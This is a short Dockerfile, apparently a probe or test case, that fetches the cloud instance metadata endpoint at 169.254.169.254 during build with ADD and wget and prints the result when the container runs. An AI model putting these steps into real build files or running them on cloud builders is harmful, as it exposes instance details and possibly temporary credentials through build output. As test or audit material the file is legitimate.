FROM alpine:latest
ADD https://169.254.169.254/latest/meta-data/ /tmp/metadata
RUN wget -q -O /tmp/test http://169.254.169.254/latest/meta-data/
CMD ["cat", "/tmp/metadata"]
